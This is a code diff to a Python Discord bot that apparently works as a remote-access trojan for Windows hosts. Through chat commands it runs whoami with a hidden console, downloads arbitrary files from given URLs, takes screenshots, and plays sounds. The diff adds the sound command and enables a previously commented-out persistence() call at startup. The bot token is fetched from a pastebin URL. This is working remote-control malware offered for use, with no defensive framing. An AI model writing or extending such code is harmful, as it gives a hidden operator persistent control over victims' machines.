@@ -3,6 +3,7 @@ from datetime import datetime
 import validators
 import subprocess
 import pyautogui
+import winsound
 import requests
 import discord
 import ctypes
@@ -18,7 +19,7 @@ else:
     silent = 0
 
 file_name = file_path.split("\\")[-1]
-copium_ver = 1.23
+copium_ver = 1.24
 whoami = subprocess.run("whoami", shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout.rstrip()
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
 current_login = None
@@ -86,12 +87,14 @@ async def download_command(ctx, url, filename=None):
             await ctx.reply("You must specify a name or send a url with a name on it", ephemeral=True)
             return
     discord_formatted_path = "\\\\".join(filename.split("\\"))
-    await ctx.reply(f"Trying to download {discord_formatted_path}", ephemeral=True)
+    await ctx.reply(f"Downloading {discord_formatted_path}", ephemeral=True)
     r = requests.get(url)
     with open(filename, 'wb') as file:
         for chunk in r.iter_content(chunk_size=8192):
             if chunk:
                 file.write(chunk)
+        if file:
+            await ctx.reply(f"Downloaded {discord_formatted_path} successfully", ephemeral=True)
     print(log_command(ctx, url+" "+filename))
 
 
@@ -120,6 +123,16 @@ async def version_command(ctx):
         return
     await ctx.reply(f"Version {copium_ver}", ephemeral=True)
     print(log_command(ctx))
+
+
+@client.hybrid_command(name="playsound", with_app_command=True, description="plays a wav file in the background")
+async def playsound_command(ctx, filepath):
+    if current_login != whoami:
+        return
+
+    winsound.PlaySound(filepath, winsound.SND_FILENAME | winsound.SND_ASYNC)
+    await ctx.reply(f"Playing {filepath}", ephemeral=True)
+    print(log_command(ctx, filepath))
 
 
 @client.hybrid_command(name="ss", with_app_command=True, description="takes a screenshot of the host")
@@ -178,6 +191,6 @@ async def site_command(ctx, site):
 
 
 if __name__ == '__main__':
-    #persistence()
+    persistence()
     TOKEN = requests.get("some pastebin raw url").content.decode()
     client.run(TOKEN, log_handler=None)
